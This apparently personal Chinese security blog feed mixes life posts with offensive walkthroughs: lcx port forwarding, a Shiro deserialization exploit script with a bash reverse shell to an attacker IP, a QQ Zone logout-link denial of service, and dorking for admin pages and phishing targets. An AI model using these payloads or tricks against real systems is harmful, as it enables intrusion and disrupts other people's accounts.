<h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><p>把<code>lcx</code>上传到目标服务器（比如我们可以把<code>lcx.exe</code>上传到<code>www.xxx.com</code>地址，然后<code>lcx.exe</code>就变成了<code>www.xxx.com/lcx.exe</code>，然后在目标机器上执行<code>wget</code>讲起下载到目标服务器）</p>
<p>然后执行如下命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">本机：lcx.exe -listen 51 33891    注意：本机必须要外网服务器，就是别人可以访问你的&#96;ip&#96;</span></pre></td></tr><tr><td class="code"><pre><span class="line">目标服务器:lcx.exe -slave 公网ip 51 目标服务器ip 3389</span></pre></td></tr></table></figure>

<p>本机执行的命令意思为：</p>
<p>利用<code>lcx.exe</code>监听本地<code>51</code>端口，然后讲起转到<code>33891</code>端口</p>
<p>目标服务器执行的命令为：</p>
<p>利用<code>lcx.exe</code>去连接本机<code>ip</code>的<code>51</code>端口，并且将目标服务器的<code>3389</code>端口转发给他</p>
<p>攻击机：</p>
<p><img src="http://static.zybuluo.com/1kbfree/0wu0cgdcgmgs3wb737h7gx78/image.png" alt="image.png-23.7kB"></p>
<p>受害机：</p>
<p><img src="http://static.zybuluo.com/1kbfree/g51kx1hkhpjgg668vara7vwu/image.png" alt="image.png-24.2kB"></p>
<p>然后直接连接攻击机的<code>33891</code>端口即可</p>
<p><img src="http://static.zybuluo.com/1kbfree/wi4i3149atyepl1fcz4l921o/image.png" alt="image.png-23.6kB"></p>
]]></content>
      <categories>
        <category>兴趣爱好</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>从0开始学内网渗透资料</title>
    <url>/2019/12/21/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</url>
    <content><![CDATA[<p><a href="https://github.com/l3m0n/pentest_study" target="_blank" rel="noopener">https://github.com/l3m0n/pentest_study</a></p>
]]></content>
      <categories>
        <category>兴趣爱好</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>不知道标题的文章</title>
    <url>/2019/12/19/%E4%B8%8D%E7%9F%A5%E9%81%93%E6%A0%87%E9%A2%98%E7%9A%84%E6%96%87%E7%AB%A0/</url>
    <content><![CDATA[<p>写了很多，不好意思发出来。    </p>
]]></content>
      <categories>
        <category>日记</category>
      </categories>
      <tags>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>利用shiro反序列化漏洞反弹shell获取目标服务器权限</title>
    <url>/2019/12/19/%E5%88%A9%E7%94%A8shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8D%E5%BC%B9shell%E8%8E%B7%E5%8F%96%E7%9B%AE%E6%A0%87%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9D%83%E9%99%90/</url>
    <content><![CDATA[<h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><p><img src="http://static.zybuluo.com/1kbfree/sigfs6w5jgm1k7pb7c4c44bm/image.png" alt="image.png-88.3kB"></p>
<p>只要在<code>cookie</code>中传递<code>rememberMe=awdawd</code>，然后返回包存在<code>rememberMe=deleteMe;</code>的都可能存在<code>shiro</code>反序列化漏洞</p>
<h2 id="安装工具"><a href="#安装工具" class="headerlink" title="安装工具"></a>安装工具</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;frohoff&#x2F;ysoserial.git</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/j2uzg97hv7lexby87wdxqriv/image.png" alt="image.png-58.3kB"></p>
<p>安装<code>mvn</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt install maven</span></pre></td></tr></table></figure>

<p>然后执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mvn package -DskipTests</span></pre></td></tr></table></figure>

<p>就会生成一个<code>target</code>目录，全部工具都在下面</p>
<p><img src="http://static.zybuluo.com/1kbfree/e889d8srnz056c72obfzn4l9/image.png" alt="image.png-41.8kB"></p>
<p>还有一个工具是构造恶意<code>rememberMe</code>的，下面会讲用法（我将其存为<code>1.py</code>）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span></pre></td></tr><tr><td class="code"><pre><span class="line"> </span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_rememberme</span><span class="params">(command)</span>:</span> <span class="comment">#ysoserial-0.0.6-SNAPSHOT-all.jar #文件需要在该文件目录</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    popen = subprocess.Popen([<span class="string">'java'</span>, <span class="string">'-jar'</span>, <span class="string">'ysoserial-0.0.6-SNAPSHOT-all.jar'</span>, <span class="string">'JRMPClient'</span>, command], stdout=subprocess.PIPE)</span></pre></td></tr><tr><td class="code"><pre><span class="line">    BS = AES.block_size</span></pre></td></tr><tr><td class="code"><pre><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span></pre></td></tr><tr><td class="code"><pre><span class="line">    key = base64.b64decode(<span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span>)</span></pre></td></tr><tr><td class="code"><pre><span class="line">    iv = uuid.uuid4().bytes</span></pre></td></tr><tr><td class="code"><pre><span class="line">    encryptor = AES.new(key, AES.MODE_CBC, iv)</span></pre></td></tr><tr><td class="code"><pre><span class="line">    file_body = pad(popen.stdout.read())</span></pre></td></tr><tr><td class="code"><pre><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">return</span> base64_ciphertext</span></pre></td></tr><tr><td class="code"><pre><span class="line"> </span></pre></td></tr><tr><td class="code"><pre><span class="line"> </span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span></pre></td></tr><tr><td class="code"><pre><span class="line">    payload = encode_rememberme(sys.argv[<span class="number">1</span>])</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">print</span> <span class="string">"rememberMe=&#123;0&#125;"</span>.format(payload.decode())</span></pre></td></tr></table></figure>

<h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xxx.xxx.xx1 攻击机（一定要是外网的，否则无法反弹shell）</span></pre></td></tr><tr><td class="code"><pre><span class="line">xxx.xxx.xx2 目标机</span></pre></td></tr></table></figure>

<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>1、构造恶意<code>rememberMe</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python 1.py xxx.xxx.xx1:PORT1</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/xxqhlhmmx487h7id5yrjry0u/image.png" alt="image.png-25.9kB"></p>
<p>2、制作<code>bash</code>反弹<code>shell</code>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;xxx.xxx.xx1&#x2F;外网服务器监听端口（我用的是448） 0&gt;&amp;1</span></pre></td></tr></table></figure>

<p>然后要放到<a href="http://www.jackson-t.ca/runtime-exec-payloads.html加密，因为他放入`rememberMe`会解`base64`" target="_blank" rel="noopener">http://www.jackson-t.ca/runtime-exec-payloads.html加密，因为他放入`rememberMe`会解`base64`</a></p>
<p><img src="http://static.zybuluo.com/1kbfree/adzfgqk5q29nxcmlht5u3y6q/image.png" alt="image.png-114.1kB"></p>
<p>3、然后使用<code>ysoserial</code>的监听模块监听<code>PORT1</code>端口（第一步生成<code>rememberMe</code>的端口）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 4321 CommonsCollections5 &#39;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNjUuMjIuNDkuMTcvNDQ4IDA+JjE&#x3D;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#39;</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/gceifm7spf5tmoxhpsnsv122/image.png" alt="image.png-17.6kB"></p>
<p>4、监听第二步制作的反弹<code>shell</code>的端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp 448</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/fgjqokkp76246odk4de0jnaz/image.png" alt="image.png-5.8kB"></p>
<p>5、然后在目标站上抓包，在<code>cookie</code>里加入第一步生成的<code>rememberMe</code></p>
<p><img src="http://static.zybuluo.com/1kbfree/p19nqs85thtet2ik4591rp60/image.png" alt="image.png-125.9kB"></p>
<p>然后就可以看到<code>nc</code>反弹过来的<code>shell</code></p>
<p><img src="http://static.zybuluo.com/1kbfree/sjncoka5tm17797zywu3d1o9/image.png" alt="image.png-18.9kB"></p>
<p>成功获取<code>shell</code>，由于是<code>linux</code>，所以无后续。</p>
]]></content>
      <categories>
        <category>兴趣爱好</category>
        <category>好文</category>
      </categories>
      <tags>
        <tag>Hacker</tag>
      </tags>
  </entry>
  <entry>
    <title>文艺彩句</title>
    <url>/2019/12/18/%E6%96%87%E8%89%BA%E5%BD%A9%E5%8F%A5/</url>
    <content><![CDATA[<blockquote>
<p>来自知乎话题：<br><a href="https://www.zhihu.com/question/65283816" target="_blank" rel="noopener">https://www.zhihu.com/question/65283816</a></p>
</blockquote>
<h2 id="关于人生"><a href="#关于人生" class="headerlink" title="关于人生"></a>关于人生</h2><ol>
<li><p>这世界本就没有任何一句话，<br>可以让你醍醐灌顶。<br>真正叫你醍醐灌顶的，<br>只能是一段经历。<br>而那句话，只是火药仓库内划燃的一根火柴。</p>
</li>
<li><p>少年不识愁滋味，爱上层楼。爱上层楼。为赋新词强说愁。<br>而今尝尽愁滋味，欲说还休。欲说还休。却道天凉好个秋。<br>——辛弃疾</p>
</li>
<li><p>怕是当年眉清目秀清澈如许的少年，经年也成了推杯换盏乌烟瘴气的嘴脸。</p>
</li>
<li><p>当你穿过了暴风雨，你就不再是原来的那个人。</p>
</li>
<li><p>人生最可怕的事 是一边后悔一边生活，而不是孤单。</p>
</li>
<li><p>我们讲起年少时，常因短时的无望，联想到今生。那时候的憧憬都好热烈，扬言要受苦，要从蒙昧中解缚。连怀缅方式都妥帖规划。生命虽未完成，但那应该是一种自由</p>
</li>
<li><p>虽然我们互相笑着说再见，但是我们都心知肚明，分离即永别。</p>
</li>
</ol>
<h2 id="关于爱情"><a href="#关于爱情" class="headerlink" title="关于爱情"></a>关于爱情</h2><ol>
<li><p>怕是当年眉清目秀清澈如许的少年，经年也成了推杯换盏乌烟瘴气的嘴脸。</p>
</li>
<li><p><strong>运气好的话，你会遇到一个保护你的天真、让你安心当小朋友的人。</strong></p>
</li>
<li><p>我先过银河，但我只爱星星。</p>
</li>
<li><p>你笑时，雷声温柔，暴雨无声。</p>
</li>
</ol>
<h2 id="关于理想"><a href="#关于理想" class="headerlink" title="关于理想"></a>关于理想</h2><ol>
<li><p>以凡人之躯比肩神明</p>
</li>
<li><p>你们一直抱怨这个地方，但是你们却没有勇气走出这里。</p>
</li>
</ol>
]]></content>
      <categories>
        <category>关于生活</category>
      </categories>
      <tags>
        <tag>人生BUFF</tag>
      </tags>
  </entry>
  <entry>
    <title>qq空间一处有趣的拒绝服务</title>
    <url>/2019/12/18/qq%E7%A9%BA%E9%97%B4%E4%B8%80%E5%A4%84%E6%9C%89%E8%B6%A3%E7%9A%84%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1/</url>
    <content><![CDATA[<blockquote>
<p>作者是这个漏洞思路的原创，我写这个漏洞的时候未在互联网上看过相关资料<br>还有如<code>img</code>引入退出链接导致拒绝服务也是本人原创的（我敢保证写退出文章前未有此思路），本文写于18年，因为博客刚写。</p>
</blockquote>
<p>还有几个类似案例也是我写的</p>
<p><a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=46282" target="_blank" rel="noopener">https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=46282</a></p>
<hr>
<h2 id="漏洞过程"><a href="#漏洞过程" class="headerlink" title="漏洞过程"></a>漏洞过程</h2><p>1、发送如下数据包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;cgi-bin&#x2F;qzshare&#x2F;cgi_qzshareadd_url?g_tk&#x3D;1395430061&amp;qzonetoken&#x3D;3ca935b4acf8031d273301661877e5b2c7d888e0655d828df4496c05672e3898a1842753399054f2affef6ad HTTP&#x2F;1.1</span></pre></td></tr><tr><td class="code"><pre><span class="line">Host: sns.qzone.qq.com</span></pre></td></tr><tr><td class="code"><pre><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko&#x2F;20100101 Firefox&#x2F;52.0</span></pre></td></tr><tr><td class="code"><pre><span class="line">Accept: *&#x2F;*</span></pre></td></tr><tr><td class="code"><pre><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span></pre></td></tr><tr><td class="code"><pre><span class="line">Accept-Encoding: gzip, deflate</span></pre></td></tr><tr><td class="code"><pre><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span></pre></td></tr><tr><td class="code"><pre><span class="line">Referer: https:&#x2F;&#x2F;sns.qzone.qq.com&#x2F;cgi-bin&#x2F;qzshare&#x2F;cgi_qzshare_onekey?desc&#x3D;%E6%B5%8B%E8%AF%95%E4%B8%80%E4%B8%8B%E5%95%A6~&amp;url&#x3D;http:&#x2F;&#x2F;www.qq.com&amp;showcount&#x3D;1&amp;desc&#x3D;123&amp;pics&#x3D;http:&#x2F;&#x2F;www.slimego.cn&#x2F;images&#x2F;logo.png</span></pre></td></tr><tr><td class="code"><pre><span class="line">Content-Length: 300</span></pre></td></tr><tr><td class="code"><pre><span class="line">Cookie: 这是cookie</span></pre></td></tr><tr><td class="code"><pre><span class="line">DNT: 1</span></pre></td></tr><tr><td class="code"><pre><span class="line">Connection: close</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">where&#x3D;0&amp;entryuin&#x3D;1900065568&amp;spaceuin&#x3D;1900065568&amp;title&#x3D;123321&amp;summary&#x3D;123321&amp;token&#x3D;1395430061&amp;sendparam&#x3D;&amp;description&#x3D;%E6%B5%8B%E8%AF%95%E4%B8%80%E4%B8%8B%E5%95%A6~&amp;type&#x3D;4&amp;url&#x3D;http%3A%2F%2Fwww.qq.com&amp;site&#x3D;&amp;to&#x3D;&amp;share2weibo&#x3D;0&amp;pics&#x3D;https:&#x2F;&#x2F;pay.qq.com&#x2F;cgi-bin&#x2F;login&#x2F;user_logout.cgi?1.png&amp;fupdate&#x3D;1&amp;notice&#x3D;1</span></pre></td></tr></table></figure>

<p>注意这里的<code>pics</code>参数，这个值是一个 类似退出的<code>url</code> 那么这里的思路就是 用户点开空间然后<code>&lt;img src=https://pay.qq.com/cgi-bin/login/user_logout.cgi?1.png&gt;</code>，如图</p>
<p><img src="http://static.zybuluo.com/1kbfree/1g30dj5wc257uqi4g71wnn19/image.png" alt="image.png-252.8kB"></p>
<p>导致用户后台自动访问退出的<code>url</code>(但是腾讯空间的退出<code>url</code>存在<code>token</code>，所以这是另一处清除域<code>cookie</code>的<code>url</code>)</p>
<p>那么来测试一下，有另一个号 点开空间</p>
<p><img src="http://static.zybuluo.com/1kbfree/2fg9ehi7z5vvkzni9jhpsfh0/image.png" alt="image.png-705.6kB"></p>
<p>然后在刷新一下就会退出</p>
<p><img src="http://static.zybuluo.com/1kbfree/yxa2yxb8827ssmbhzlmcfdnr/image.png" alt="image.png-1070.2kB"></p>
<p>那么现在的危害就是，让我刷空间的好友 后台自动访问退出的<code>url</code> 然后导致无法正常操作 如评论、点赞、转发、发说说等 并且会一直跳转到登录处 所以个人觉得危害还是挺大的 而且这个方法还可以利用为获取到谁访问了<code>qq</code>空间（这个是针对那些黄钻会员隐藏了空间来源访问），那么我们就可以写入一个来源访问系统的，然后利用<code>Referer</code>所传递的值来知道是谁访问了我的<code>qq</code>空间（当我们登录qq空间后 会将手机号带入到<code>url</code>中，所以可以获取到访问我qq空间的用户的qq号，虽然危害不大 但是还算是一个设计缺陷 导致了外联可以访问）</p>
]]></content>
      <categories>
        <category>兴趣爱好</category>
        <category>好文</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>一个不存在的会议议题</title>
    <url>/2019/12/18/%E4%B8%80%E4%B8%AA%E4%B8%8D%E5%AD%98%E5%9C%A8%E7%9A%84%E4%BC%9A%E8%AE%AE%E8%AE%AE%E9%A2%98/</url>
    <content><![CDATA[<blockquote>
<p>这本是一个会议议题的，然后没选上。</p>
</blockquote>
<h1 id="会议内容"><a href="#会议内容" class="headerlink" title="会议内容"></a>会议内容</h1><h2 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h2><p>我会对所测试过的系统、挖掘的漏洞写在一个页面中</p>
<p><img src="http://static.zybuluo.com/1kbfree/g4x0bklthlrnfikvivfgibu9/image.png" alt="image.png-14.3kB"></p>
<p>暂时是手工添加很尴尬。。。以后就想把测试系统的<code>burp</code>日志包都抓下来，然后用脚本匹配自动化写入到这里。</p>
<p>1、为了查漏补缺<br>2、为了可以扩展漏洞<br>3、为了其他漏洞出来后我可以马上定位漏洞点</p>
<h2 id="信息收集心得"><a href="#信息收集心得" class="headerlink" title="信息收集心得"></a>信息收集心得</h2><p>对一个系统进行挖掘最重要的就是信息收集部分，对一个系统收集的越多、攻击链就越大，下面就是我在漏洞挖掘中一些信息收集的心得</p>
<p><a href="https://www.zybuluo.com/mdeditor#1484882" target="_blank" rel="noopener">https://www.zybuluo.com/mdeditor#1484882</a></p>
<p>一般拿到系统我会先用如下语法查看他是否有后台手册、或者开发手册（都是为了看看有没有弱口令等敏感信息）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">google语法</span></pre></td></tr><tr><td class="code"><pre><span class="line">site:ooxx.com filetype:xls</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">百度云盘搜索xx厂商，然后选取看文档文件的类型</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/rljrl0sikxweiya8ryua9g1o/image.png" alt="image.png-143.4kB"></p>
<p>然后会进行找后台地址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">site:xxx.xxx admin</span></pre></td></tr><tr><td class="code"><pre><span class="line">site:xxx.xxx login</span></pre></td></tr><tr><td class="code"><pre><span class="line">site:xxx.xxx system</span></pre></td></tr><tr><td class="code"><pre><span class="line">site:xxx.xxx 管理</span></pre></td></tr><tr><td class="code"><pre><span class="line">site:xxx.xxx 登录</span></pre></td></tr><tr><td class="code"><pre><span class="line">site:xxx.xxx 内部</span></pre></td></tr><tr><td class="code"><pre><span class="line">site:xxx.xxx 系统</span></pre></td></tr></table></figure>

<p>或者找邮箱进行钓鱼（用低位的跳转漏洞，让管理员打开钓鱼页面）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">site:xxx.xxx 邮件</span></pre></td></tr><tr><td class="code"><pre><span class="line">site:xxx.xxx email</span></pre></td></tr></table></figure>

<p>找对应的漏洞（比较没效率）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">site:xxx.com inurl:jmx-console</span></pre></td></tr><tr><td class="code"><pre><span class="line">site:xxx.com inurl:&#x2F;public&#x2F;index.php</span></pre></td></tr><tr><td class="code"><pre><span class="line">... ...</span></pre></td></tr></table></figure>

<p>使用<code>github</code>来搜索厂商敏感信息</p>
<p><img src="http://static.zybuluo.com/1kbfree/hvkqulqfyl7vm0my3ydiow3z/image.png" alt="image.png-151kB"></p>
<h3 id="案例一"><a href="#案例一" class="headerlink" title="案例一"></a>案例一</h3><p>在对一个系统挖掘的时候他有一个如下的<code>url</code>看收货地址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.xxx.xxx&#x2F;xxx.html?xxxid&#x3D;2018WOIDJWOIDJ5201314</span></pre></td></tr></table></figure>

<p>然后可以用搜索引擎来对其进行搜索，并且成功发现几十个的用户收货地址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">site:xxx.xxx inurl:xxxid&#x3D;20</span></pre></td></tr></table></figure>

<p>当然这个用法还可以用来对已挖掘的漏洞查找更多漏洞（以洞找洞），比如<code>www.xxx.com</code>下的域名的一个参数<code>searchxxx</code>存在<code>xss</code>漏洞，然后我可以用搜索引擎来找更多的<code>xss</code>漏洞</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">site:xxx.com inurl:searchxxx&#x3D;</span></pre></td></tr></table></figure>

<p>并且找出其他2个<code>xss</code>漏洞</p>
<h3 id="案例二"><a href="#案例二" class="headerlink" title="案例二"></a>案例二</h3><p>这个是一个驻场的项目，给的环境是用他们电脑然后可以黑盒+白盒，然后我利用黑盒（看<code>js</code>然后拼接）找出了一个接口（<code>http://xxx.xxx.xxx/api/getxxxx.html</code>然后<code>post</code>传递的是<code>xxxname=</code>这里因为在公司内部，很容易看到其他员工的名字直接改成拼音），这个接口打开然后发现是可以获取用户的登录时间、账号密码（加密）等，但是因为这里的密码是加密的，然后我让另一个白盒的朋友去找出对应的加密函数并且解密了密码，就直接登录了他们的员工系统</p>
<h3 id="案例三"><a href="#案例三" class="headerlink" title="案例三"></a>案例三</h3><p>上传处只能上传<code>.txt、.png、.jpg等</code>（白名单），然后我后面发现了一个回收功能和<code>window</code>这样子是一样的，就是可以拖进去然后拖出来，但是在期间抓包的时候，发现他拖到里面再拖出来的时候，参数是这样的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fname&#x3D;xxx.txt&amp;fid&#x3D;1455230&amp;content&#x3D;&lt;?php echo 1?&gt;</span></pre></td></tr></table></figure>

<p>然后我把<code>fname</code>改成了<code>1.php</code>可以打开的，但是没有解析为<code>php</code>脚本，然后改成了<code>1.html</code>就可以解析为<code>html</code>，当成存储<code>xss</code></p>
<h3 id="有趣的漏洞"><a href="#有趣的漏洞" class="headerlink" title="有趣的漏洞"></a>有趣的漏洞</h3><p>利用<code>waf</code>和退出功能来对网站产生影响业务的漏洞</p>
<p><a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=46282" target="_blank" rel="noopener">https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=46282</a><br><a href="https://www.zybuluo.com/1kbfree/note/1359028" target="_blank" rel="noopener">https://www.zybuluo.com/1kbfree/note/1359028</a></p>
]]></content>
      <categories>
        <category>兴趣爱好</category>
        <category>思路</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>[每周推荐]《以幽默的方式过一生》</title>
    <url>/2019/12/18/%E6%AF%8F%E5%91%A8%E6%8E%A8%E8%8D%90-%E3%80%8A%E4%BB%A5%E5%B9%BD%E9%BB%98%E7%9A%84%E6%96%B9%E5%BC%8F%E8%BF%87%E4%B8%80%E7%94%9F%E3%80%8B/</url>
    <content><![CDATA[<h1 id="本书介绍"><a href="#本书介绍" class="headerlink" title="本书介绍"></a>本书介绍</h1><p>《以幽默的方式过一生》是中信出版社在2017年6月出版的图书，作者是琢磨先生</p>
<h1 id="作者介绍"><a href="#作者介绍" class="headerlink" title="作者介绍"></a>作者介绍</h1><p>琢磨先生，原名郭城，财富管理专家，新锐经济学者，一位罕见的能将哲学、心理学和经济学融会贯通的人，被媒体评价为“人性的手术刀，又给人温暖向善的力量。”</p>
<p>财经第一媒体平台功夫财经的签约嘉宾，广东卫视《财经郎眼》脱口秀策划人，中山大学客座教授，剧场脱口秀演出策划人，在各地的脱口秀演出巡演一票难求。</p>
<p>出版著作《客户服务工具集》、《水煮西游记》和《培训师》。</p>
<h1 id="书籍目录"><a href="#书籍目录" class="headerlink" title="书籍目录"></a>书籍目录</h1><p>【立春】万物复苏，莺啼燕舞<br>人生中的选择<br>身为小姐不能有感觉了再接客<br>所有的伟大，都源于一个勇敢的开始<br>【雨水】鸿雁归来，草木萌动<br>生活就是心怀最大的善意在荆棘中穿行<br>你对了又怎样<br>机场遇到初恋女友<br>爱是个动词<br>【惊蛰】春雷惊蛰，杨绿风急<br>书架奇遇记<br>带书去旅行<br>阅读的快乐<br>【春分】黄赤相交，草长莺飞<br>我路过的城市和girls<br>我是个爱逛街的人<br>机场里的小旅行<br>【清明】春雨如丝，思念如凄<br>一转身，就是一辈子<br>世界的孤儿<br>凡是发生的必然发生<br>【谷雨】谷雨断霜，万物生长<br>找个能说话的人结婚<br>我老婆是这样驯化我的<br>我就不信管不了这个家<br>【立夏】万物并秀，各守其色<br>自己和别人的关系<br>朋友如三餐<br>有些事，不必说破<br>童真的故事<br>有什么好挤的<br>【小满】小满不满，本色内敛<br>爱情，并不是生命的全部<br>毛坯恋人<br>爱情里最容易犯贱<br>【芒种】适时播种，方期有成<br>任何情况下，提升自己最重要<br>职场的建议<br>接受不完美的自己<br>【夏至】梅雨纷飞，一夜生阴<br>理发师的手艺<br>衣橱里的秘密<br>当我开车的时候，我在想什么<br>跟楼上两口子斗争的七个夜晚<br>【小暑】温如小暑，杀气未素<br>三种男人的人生<br>四种女人的人生<br>其实你没必要活得那么紧张<br>【大暑】三伏叠出，何以解暑<br>社交时代的病人<br>聊天中的符号<br>微信头像和名字<br>【立秋】清风徐来，志在外也<br>孤独的力量<br>给自己藏点小幸福<br>天地间的第一个人<br>人性难断<br>【处暑】物极必反，处暑应寒<br>婚后遇到更喜欢的人<br>恋爱模式<br>心理学里如何定义爱情<br>【白露】阴气渐重，幽径多蹊<br>你那点事，有什么好说的<br>人性中最容易犯贱的地方<br>觉得别人晒，可能是自己缺<br>【秋分】秋风乍起，息声问道<br>秋天，我迷失于一片竹林<br>星座靠谱吗<br>算卦准不准<br>【寒露】寒气凝结，精灵出没<br>灵感捕手<br>嗑瓜子<br>人生第一次动手术<br>踮着脚尖得到的东西<br>【霜降】大地蒙霜，草木落黄<br>从青春年少路过<br>一个四十岁的男人给你提个醒<br>以幽默的方式过一生<br>【立冬】土气凝寒，万物收藏<br>你为什么赚不到钱<br>花钱的原则<br>借钱的艺术<br>【小雪】瑞雪丰年，吉象立现<br>生下来，还要会教育<br>有其父必有其子<br>【大雪】冰雪寒天，勿忘前川<br>出发太久，别忘记目的地<br>不是每个人的意见都值得倾听<br>每个不能打败我的事件，都会把我变得更加璀璨<br>【冬至】西北风袭，回笼教至<br>回笼教<br>大V</p>
<h1 id="经典段"><a href="#经典段" class="headerlink" title="经典段"></a>经典段</h1><p>这本书的写法是非常幽默，读起来非常通俗易懂并且符合社会逻辑。书中讲解了生活上、事业上、人际上、哲学上、爱情上等很多领域。</p>
<p>琢磨先生在第一篇“立春”就讲过人生的路归纳起来无非两条：一条用来实践，就是正在走的这条；一条用来遗憾，没事想想就好了。也阐述了这么个观点“人生总会因为没有选择那条路而遗憾，因为人生是无法穷尽所有选择的，但人生无需遗憾，因为注定发生的事情终究会发生，只要是自己选择的路就不要太在意结果，路途是荆棘还是风景，接受就好”</p>
<p>也提到了一个总有那么点的感觉，就是人生往往在不经意间，就会向另一个方向发展。</p>
<p>还说了有所得必有所失，比如我的职业是网络安全工程师，那么我接触的电脑久学习时间长，我技术会有所提升，陪伴身边人的时间就会少。如果陪伴身边人的时间说，接触电脑和学习时间就会比较短，但是这都是自己的选择，只要得之心所想，失之情所愿就行</p>
<p>琢磨先生认为：<br>生活，就是心怀最大的善意在荆棘中穿行。<br>即使被刺伤，亦不改初衷。</p>
<p>顺势而为，随遇而安。知错即改，迷途知返。</p>
<p>在喜欢自己的人身上用心，在不喜欢自己的人身上健忘。</p>
<blockquote>
<p>所以我觉得主要的就是尊重自己的选择，并要为自己的选择付出责任，即要为人生负责。</p>
</blockquote>
<p>琢磨先生还从身边发生的事情简单的阐述了，也就是“所有的伟大，都涌于一个勇敢的开始”，我觉得这句话非常的对，不管做哪件事情难的都是第一步，第一步决定了是否有关键的最后一步，<strong>所有很多事情，只要迈出第一步，就根本停不下来。但前提是，你得开始</strong>，所以很多人离优秀只差一个开始。</p>
<p>琢磨先生说过：“<strong>一个坏朋友对你最大的打击，不是破坏了友谊，而是让你不再投入这份真诚。你的坏爱人对你最大的打击不是让你伤痕累累，而是让你再也不敢投入情感，挫败也好，伤害也好，总会成为过去，都会成为浮云。可怕的，是你用这些过去，绑架了自己的未来、</strong>”，同样的道理，不能因为一个人骗过你，而失去对所有人的信任。</p>
